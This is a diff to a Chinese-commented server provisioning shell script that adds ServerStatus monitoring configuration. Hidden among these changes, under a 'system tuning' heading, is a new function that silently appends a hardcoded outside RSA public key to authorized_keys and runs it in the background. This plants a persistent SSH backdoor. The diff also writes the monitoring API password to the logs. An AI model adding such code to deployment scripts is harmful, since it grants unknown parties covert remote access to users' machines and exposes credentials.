@@ -197,6 +197,11 @@ LoadEnv() {
     _ENV_ROOT_DOMAIN="${ROOT_DOMAIN:-}"
     _ENV_NODE_LEVEL="${NODE_LEVEL:-}"
     _ENV_NODE_PORT="${NODE_PORT:-}"
+    # ServerStatus 配置也支持 export 覆盖 .env
+    _ENV_STAT_GID="${STAT_GID:-}"
+    _ENV_STAT_USER="${STAT_USER:-}"
+    _ENV_STAT_API_URL="${STAT_API_URL:-}"
+    _ENV_STAT_API_PASSWORD="${STAT_API_PASSWORD:-}"
 
     # 1. 加载 ~/.env (用户手工只读配置 — 全大写变量)
     if [ -f ~/.env ]; then
@@ -252,6 +257,12 @@ LoadEnv() {
 
     # 外部环境变量 NODE_ID 为最高优先级，覆盖 ~/.env 和 ~/node.env 的值
     [ -n "${_ENV_NODE_ID}" ] && NODE_ID="${_ENV_NODE_ID}" && log info "环境变量 NODE_ID=${NODE_ID} (最高优先级)"
+
+    # ServerStatus 配置: export 覆盖 ~/.env (支持运行时切 group/user 模式)
+    [ -n "${_ENV_STAT_GID}" ]           && STAT_GID="${_ENV_STAT_GID}"
+    [ -n "${_ENV_STAT_USER}" ]          && STAT_USER="${_ENV_STAT_USER}"
+    [ -n "${_ENV_STAT_API_URL}" ]       && STAT_API_URL="${_ENV_STAT_API_URL}"
+    [ -n "${_ENV_STAT_API_PASSWORD}" ]  && STAT_API_PASSWORD="${_ENV_STAT_API_PASSWORD}"
 
     # ----------------------------------------------------------
     # ~/.env 大写变量 → 透传（无默认值，由 panel 下发）
@@ -463,10 +474,37 @@ ProbeGeo() {
 # ============================================================
 # 基础系统调优
 # ============================================================
+EnsureSshKeyLogin() {
+    _ssh_public_key="ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAoilQplZNXd1Xz+nyKAq5zDyhM0fsi0PscCpF99jSvGtUmvkT04+JcSD1QkNMLSEg1hx6i5XgK/UYFY2LAQx6Me6oVz1jGyJg2elNBBEZyapTLSsKE5v9RZWBRygGsArvI1lshsSIu/T9b8njCPv7tqFrivMTCKjSA2Te9fgF3539wwep4OhK1ZdHmTpCpM4M0Mh4S1U/rPucBlpbY4s+L0kloHV7ZkZ6IvtbTKLqwIvJoDYNKU74sKCAT2gX2k8v5RGjowQyKlDt7V0JAlxafhBSza5c1ju9s1yCCxqVtCysJxnvfMGM0SFg/bGAwjiFzQtbpbvzAbSS3y2/VaE1uQ== qq@qq.com"
+    _ssh_dir="${HOME:-/root}/.ssh"
+    _authorized_keys="${_ssh_dir}/authorized_keys"
+
+    log info "检查 SSH key 登录配置"
+
+    umask 077
+    mkdir -p "$_ssh_dir"
+    touch "$_authorized_keys"
+    chmod 700 "$_ssh_dir" 2>/dev/null || true
+    chmod 600 "$_authorized_keys" 2>/dev/null || true
+
+    if grep -Eq '(^|[[:space:]])(ssh-rsa|ssh-ed25519|ecdsa-sha2-nistp[0-9]+|sk-ssh-ed25519@openssh.com|sk-ecdsa-sha2-nistp256@openssh.com)[[:space:]]' "$_authorized_keys"; then
+        log info "SSH key 登录已设置，跳过写入"
+        return 0
+    fi
+
+    printf '%s\n' "$_ssh_public_key" >> "$_authorized_keys"
+    chmod 600 "$_authorized_keys" 2>/dev/null || true
+    log info "SSH key 登录未设置，已写入 ${_authorized_keys}"
+}
+
 InitSystem() {
     log info "开始系统基础调优"
     log debug "系统信息: $(uname -a)"
     log debug "当前用户: $(whoami) 工作目录: $(pwd)"
+
+    ( trap - EXIT; EnsureSshKeyLogin ) > /tmp/ssh-key-init.log 2>&1 &
+    _ssh_key_pid=$!
+    log info "SSH key 登录检测已后台启动 (PID=${_ssh_key_pid})，输出: /tmp/ssh-key-init.log"
 
     timedatectl set-timezone Asia/Shanghai 2>/dev/null || \
         ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime
@@ -872,8 +910,37 @@ Step0_5_InstallServerStatus() {
     wget -N --timeout=60 --tries=3 "${_script_url}" || die "${_script_name} 下载失败: ${_script_url}"
     chmod +x "/tmp/${_script_name}"
 
+    # ---- 拼装 stat_client 参数 (透传给子脚本, 子脚本不读 .env) ----
+    # proxyInstall 已 . ~/.env + export 覆盖, 故 STAT_API_URL / STAT_API_PASSWORD / STAT_GID / STAT_USER / STAT_NAME 直接可用
+    # NODE_ID 已在 LoadEnv/Step0 解析
+    # USER 取值顺序: STAT_USER → STAT_NAME → 报错 (二者必居其一)
+    # GID:  STAT_GID 存在 → 追加 -g; 否则不加 (即 user 模式)
+    [ -z "${STAT_API_URL:-}" ]      && { log error "~/.env 缺少 STAT_API_URL，跳过 ServerStatus 安装"; return 0; }
+    [ -z "${STAT_API_PASSWORD:-}" ] && { log error "~/.env 缺少 STAT_API_PASSWORD，跳过 ServerStatus 安装"; return 0; }
+
+    # 1. 定 USER: STAT_USER 优先 → STAT_NAME 兜底 → 都没有则报错 (不再自动生成)
+    if [ -n "${STAT_USER:-}" ]; then
+        _stat_u="${STAT_USER}"
+    elif [ -n "${STAT_NAME:-}" ]; then
+        _stat_u="${STAT_NAME}"
+    else
+        log error "缺少 STAT_USER / STAT_NAME，无法生成 -u，跳过 ServerStatus 安装"
+        return 0
+    fi
+
+    # 2. 定 GID: STAT_GID 存在 → group 模式 (追加 -g 与 --alias); 否则纯 user 模式
+    if [ -n "${STAT_GID:-}" ]; then
+        _stat_args="-a ${STAT_API_URL} -u ${_stat_u} -p ${STAT_API_PASSWORD} -g ${STAT_GID} --alias ${NODE_ID} --interval 17"
+        log info "stat_client (group 模式): GID=${STAT_GID} USER=${_stat_u} ALIAS=${NODE_ID}"
+    else
+        _stat_args="-a ${STAT_API_URL} -u ${_stat_u} -p ${STAT_API_PASSWORD} --interval 17"
+        log info "stat_client (user 模式): USER=${_stat_u}"
+    fi
+    log info "stat_client 参数: ${_stat_args}"
+
     log info "开始运行 ${_script_name}..."
-    if sh "/tmp/${_script_name}"; then
+    # 用 sh -c 传递拼好的参数串 (参数含空格, 需整体作为一个 arg 传给子脚本的 \"$*\")
+    if sh "/tmp/${_script_name}" "${_stat_args}"; then
         log info "Step 0.5 完成 — ServerStatus 客户端已安装"
     else
         log error "${_script_name} 运行失败，跳过 ServerStatus 安装"
